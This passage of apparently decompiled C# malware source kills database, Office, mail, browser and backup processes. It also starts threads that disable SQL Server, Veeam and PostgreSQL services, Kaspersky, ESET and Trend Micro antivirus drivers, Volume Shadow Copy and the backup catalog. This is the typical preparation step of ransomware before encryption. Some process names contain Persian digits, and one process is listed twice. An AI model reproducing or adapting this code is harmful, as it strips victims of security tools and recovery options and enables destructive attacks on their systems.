          checked { index4 += 1; }
        }
        Process[] processesByName5 = Process.GetProcessesByName("synctime");
        int index5 = 0;
        while (index5 < processesByName5.Length)
        {
          processesByName5[index5].Kill();
          checked { index5 += 1; }
        }
        Process[] processesByName6 = Process.GetProcessesByName("agntsvc");
        int index6 = 0;
        while (index6 < processesByName6.Length)
        {
          processesByName6[index6].Kill();
          checked { index6 += 1; }
        }
        Process[] processesByName7 = Process.GetProcessesByName("isqlplussvc");
        int index7 = 0;
        while (index7 < processesByName7.Length)
        {
          processesByName7[index7].Kill();
          checked { index7 += 1; }
        }
        Process[] processesByName8 = Process.GetProcessesByName("xfssvccon");
        int index8 = 0;
        while (index8 < processesByName8.Length)
        {
          processesByName8[index8].Kill();
          checked { index8 += 1; }
        }
        Process[] processesByName9 = Process.GetProcessesByName("mydesktopservice");
        int index9 = 0;
        while (index9 < processesByName9.Length)
        {
          processesByName9[index9].Kill();
          checked { index9 += 1; }
        }
        Process[] processesByName10 = Process.GetProcessesByName("ocautoupds");
        int index10 = 0;
        while (index10 < processesByName10.Length)
        {
          processesByName10[index10].Kill();
          checked { index10 += 1; }
        }
        Process[] processesByName11 = Process.GetProcessesByName("encsvc");
        int index11 = 0;
        while (index11 < processesByName11.Length)
        {
          processesByName11[index11].Kill();
          checked { index11 += 1; }
        }
        Process[] processesByName12 = Process.GetProcessesByName("firefox");
        int index12 = 0;
        while (index12 < processesByName12.Length)
        {
          processesByName12[index12].Kill();
          checked { index12 += 1; }
        }
        Process[] processesByName13 = Process.GetProcessesByName("tbirdconfig");
        int index13 = 0;
        while (index13 < processesByName13.Length)
        {
          processesByName13[index13].Kill();
          checked { index13 += 1; }
        }
        Process[] processesByName14 = Process.GetProcessesByName("mydesktopqos");
        int index14 = 0;
        while (index14 < processesByName14.Length)
        {
          processesByName14[index14].Kill();
          checked { index14 += 1; }
        }
        Process[] processesByName15 = Process.GetProcessesByName("ocomm");
        int index15 = 0;
        while (index15 < processesByName15.Length)
        {
          processesByName15[index15].Kill();
          checked { index15 += 1; }
        }
        Process[] processesByName16 = Process.GetProcessesByName("dbeng50");
        int index16 = 0;
        while (index16 < processesByName16.Length)
        {
          processesByName16[index16].Kill();
          checked { index16 += 1; }
        }
        Process[] processesByName17 = Process.GetProcessesByName("sqbcoreservice");
        int index17 = 0;
        while (index17 < processesByName17.Length)
        {
          processesByName17[index17].Kill();
          checked { index17 += 1; }
        }
        Process[] processesByName18 = Process.GetProcessesByName("excel");
        int index18 = 0;
        while (index18 < processesByName18.Length)
        {
          processesByName18[index18].Kill();
          checked { index18 += 1; }
        }
        Process[] processesByName19 = Process.GetProcessesByName("infopath");
        int index19 = 0;
        while (index19 < processesByName19.Length)
        {
          processesByName19[index19].Kill();
          checked { index19 += 1; }
        }
        Process[] processesByName20 = Process.GetProcessesByName("msaccess");
        int index20 = 0;
        while (index20 < processesByName20.Length)
        {
          processesByName20[index20].Kill();
          checked { index20 += 1; }
        }
        Process[] processesByName21 = Process.GetProcessesByName("mspub");
        int index21 = 0;
        while (index21 < processesByName21.Length)
        {
          processesByName21[index21].Kill();
          checked { index21 += 1; }
        }
        Process[] processesByName22 = Process.GetProcessesByName("onenote");
        int index22 = 0;
        while (index22 < processesByName22.Length)
        {
          processesByName22[index22].Kill();
          checked { index22 += 1; }
        }
        Process[] processesByName23 = Process.GetProcessesByName("outlook");
        int index23 = 0;
        while (index23 < processesByName23.Length)
        {
          processesByName23[index23].Kill();
          checked { index23 += 1; }
        }
        Process[] processesByName24 = Process.GetProcessesByName("powerpnt");
        int index24 = 0;
        while (index24 < processesByName24.Length)
        {
          processesByName24[index24].Kill();
          checked { index24 += 1; }
        }
        Process[] processesByName25 = Process.GetProcessesByName("steam");
        int index25 = 0;
        while (index25 < processesByName25.Length)
        {
          processesByName25[index25].Kill();
          checked { index25 += 1; }
        }
        Process[] processesByName26 = Process.GetProcessesByName("thebat");
        int index26 = 0;
        while (index26 < processesByName26.Length)
        {
          processesByName26[index26].Kill();
          checked { index26 += 1; }
        }
        Process[] processesByName27 = Process.GetProcessesByName("thunderbird");
        int index27 = 0;
        while (index27 < processesByName27.Length)
        {
          processesByName27[index27].Kill();
          checked { index27 += 1; }
        }
        Process[] processesByName28 = Process.GetProcessesByName("visio");
        int index28 = 0;
        while (index28 < processesByName28.Length)
        {
          processesByName28[index28].Kill();
          checked { index28 += 1; }
        }
        Process[] processesByName29 = Process.GetProcessesByName("winword");
        int index29 = 0;
        while (index29 < processesByName29.Length)
        {
          processesByName29[index29].Kill();
          checked { index29 += 1; }
        }
        Process[] processesByName30 = Process.GetProcessesByName("wordpad");
        int index30 = 0;
        while (index30 < processesByName30.Length)
        {
          processesByName30[index30].Kill();
          checked { index30 += 1; }
        }
        Process[] processesByName31 = Process.GetProcessesByName("thunderbird");
        int index31 = 0;
        while (index31 < processesByName31.Length)
        {
          processesByName31[index31].Kill();
          checked { index31 += 1; }
        }
        Process[] processesByName32 = Process.GetProcessesByName("notepad");
        int index32 = 0;
        while (index32 < processesByName32.Length)
        {
          processesByName32[index32].Kill();
          checked { index32 += 1; }
        }
        Process[] processesByName33 = Process.GetProcessesByName("calc");
        int index33 = 0;
        while (index33 < processesByName33.Length)
        {
          processesByName33[index33].Kill();
          checked { index33 += 1; }
        }
        Process[] processesByName34 = Process.GetProcessesByName("wuauclt");
        int index34 = 0;
        while (index34 < processesByName34.Length)
        {
          processesByName34[index34].Kill();
          checked { index34 += 1; }
        }
        Process[] processesByName35 = Process.GetProcessesByName("onedrive");
        int index35 = 0;
        while (index35 < processesByName35.Length)
        {
          processesByName35[index35].Kill();
          checked { index35 += 1; }
        }
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void kill_services()
    {
      try
      {
        new Thread(new ThreadStart(Class03.Disable_1vmickvpexchange)).Start();
        new Thread(new ThreadStart(Class03.Disable_2vmicguestinterface)).Start();
        new Thread(new ThreadStart(Class03.Disable_3vmicshutdown)).Start();
        new Thread(new ThreadStart(Class03.Disable_4vmicheartbeat)).Start();
        new Thread(new ThreadStart(Class03.Disable_5vmicrdv)).Start();
        new Thread(new ThreadStart(Class03.Disable_6storflt)).Start();
        new Thread(new ThreadStart(Class03.Disable_7vmictimesyn)).Start();
        new Thread(new ThreadStart(Class03.Disable_8vmicvss)).Start();
        new Thread(new ThreadStart(Class03.Disable_9MSSQLFDLauncher)).Start();
        new Thread(new ThreadStart(Class03.Disable_10MSSQLSERVER)).Start();
        new Thread(new ThreadStart(Class03.Disable_11SERVERAGENT)).Start();
        new Thread(new ThreadStart(Class03.Disable_12SQLBrowser)).Start();
        new Thread(new ThreadStart(Class03.Disable_13SQLTELEMETRY)).Start();
        new Thread(new ThreadStart(Class03.Disable_14MsDtsServer130)).Start();
        new Thread(new ThreadStart(Class03.Disable_15SSISTELEMETRY130)).Start();
        new Thread(new ThreadStart(Class03.Disable_16SQLWriter)).Start();
        new Thread(new ThreadStart(Class03.Disable_17MSSQLVEEAMSQL2012)).Start();
        new Thread(new ThreadStart(Class03.Disable_18SQLAgentVEEAMSQL2012)).Start();
        new Thread(new ThreadStart(Class03.Disable_19MSSQL)).Start();
        new Thread(new ThreadStart(Class03.Disable_20SQLAgent)).Start();
        new Thread(new ThreadStart(Class03.Disable_21MSSQLServerADHelper100)).Start();
        new Thread(new ThreadStart(Class03.Disable_22MSSQLServerOLAPService)).Start();
        new Thread(new ThreadStart(Class03.Disable_23MsDtsServer100)).Start();
        new Thread(new ThreadStart(Class03.Disable_24SQLTELEMETRYHL)).Start();
        new Thread(new ThreadStart(Class03.Disable_25TMBMServer)).Start();
        new Thread(new ThreadStart(Class03.Disable_26MSSQLPROGID)).Start();
        new Thread(new ThreadStart(Class03.Disable_27MSSQLWOLTERSKLUWER)).Start();
        new Thread(new ThreadStart(Class03.Disable_28SQLAgentPROGID)).Start();
        new Thread(new ThreadStart(Class03.Disable_29SQLAgentWOLTERSKLUWER)).Start();
        new Thread(new ThreadStart(Class03.Disable_30MSSQLFDLauncherOPTIMA)).Start();
        new Thread(new ThreadStart(Class03.Disable_31MSSQLOPTIMA)).Start();
        new Thread(new ThreadStart(Class03.Disable_32SQLAgentOPTIMA)).Start();
        new Thread(new ThreadStart(Class03.Disable_33ReportServerOPTIMA)).Start();
        new Thread(new ThreadStart(Class03.Disable_34msftesqlSQLEXPRESS)).Start();
        new Thread(new ThreadStart(Class03.Disable_35postgresql_x64_9_4)).Start();
        new Thread(new ThreadStart(Class03.Disable_36WRSVC)).Start();
        new Thread(new ThreadStart(Class03.Disable_37ekrn)).Start();
        new Thread(new ThreadStart(Class03.Disable_38klim6)).Start();
        new Thread(new ThreadStart(Class03.Disable_39AVP18_0_0)).Start();
        new Thread(new ThreadStart(Class03.Disable_40KLIF)).Start();
        new Thread(new ThreadStart(Class03.Disable_41klpd)).Start();
        new Thread(new ThreadStart(Class03.Disable_42klflt)).Start();
        new Thread(new ThreadStart(Class03.Disable_43klbackupdisk)).Start();
        new Thread(new ThreadStart(Class03.Disable_44klbackupflt)).Start();
        new Thread(new ThreadStart(Class03.Disable_45klkbdflt)).Start();
        new Thread(new ThreadStart(Class03.Disable_46klmouflt)).Start();
        new Thread(new ThreadStart(Class03.Disable_47klhk)).Start();
        new Thread(new ThreadStart(Class03.Disable_48KSDE)).Start();
        new Thread(new ThreadStart(Class03.Disable_49kltap)).Start();
        new Thread(new ThreadStart(Class03.Disable_50TmFilter)).Start();
        new Thread(new ThreadStart(Class03.Disable_51TMLWCSService)).Start();
        new Thread(new ThreadStart(Class03.Disable_52tmusa)).Start();
        new Thread(new ThreadStart(Class03.Disable_53TmPreFilter)).Start();
        new Thread(new ThreadStart(Class03.Disable_54TMSmartRelayService)).Start();
        new Thread(new ThreadStart(Class03.Disable_55TMiCRCScanService)).Start();
        new Thread(new ThreadStart(Class03.Disable_56VSApiNt)).Start();
        new Thread(new ThreadStart(Class03.Disable_57TmCCSF)).Start();
        new Thread(new ThreadStart(Class03.Disable_58tmlisten)).Start();
        new Thread(new ThreadStart(Class03.Disable_59ntrtscan)).Start();
        new Thread(new ThreadStart(Class03.Disable_60ofcservice)).Start();
        new Thread(new ThreadStart(Class03.Disable_61Shadow_Copiese)).Start();
        new Thread(new ThreadStart(Class03.Disable_62catalog)).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void KillProcess(string processName)
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName(processName);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { index += 1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void kill_processes1()
    {
      try
      {
        Class03.KillProcess("sql");
        Class03.KillProcess("msftesql.exe");
        Class03.KillProcess("sqlagent.exe");
        Class03.KillProcess("sqlbrowser.exe");
        Class03.KillProcess("sqlservr.exe");
        Class03.KillProcess("sqlwriter.exe");
        Class03.KillProcess("oracle.exe");
        Class03.KillProcess("ocssd.exe");
        Class03.KillProcess("dbsnmp.exe");
        Class03.KillProcess("synctime.exe");
        Class03.KillProcess("agntsrvc.exe");
        Class03.KillProcess("mydesktopqos.exe");
        Class03.KillProcess("isqlplussvc.exe");
        Class03.KillProcess("xfssvccon.exe");
        Class03.KillProcess("mydesktopservice.exe");
        Class03.KillProcess("ocautoupds.exe");
        Class03.KillProcess("encsvc.exe");
        Class03.KillProcess("firefoxconfig.exe");
        Class03.KillProcess("tbirdconfig.exe");
        Class03.KillProcess("ocomm.exe");
        Class03.KillProcess("mysqld.exe");
        Class03.KillProcess("mysqld-nt.exe");
        Class03.KillProcess("mysqld-opt.exe");
        Class03.KillProcess("dbeng۵۰.exe");
        Class03.KillProcess("sqbcoreservice.exe");
        Class03.KillProcess("excel.exe");
        Class03.KillProcess("infopath.exe");
        Class03.KillProcess("msaccess.exe");
        Class03.KillProcess("mspub.exe");
        Class03.KillProcess("onenote-nt.exe");
        Class03.KillProcess("outlook-opt.exe");
        Class03.KillProcess("powerpnt.exe");
        Class03.KillProcess("steam.exe");
        Class03.KillProcess("thebat.exe");
        Class03.KillProcess("thebat۶۴.exe");
        Class03.KillProcess("thunderbird.exe");
        Class03.KillProcess("visio.exe");
        Class03.KillProcess("winword.exe");
        Class03.KillProcess("wordpad.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
}
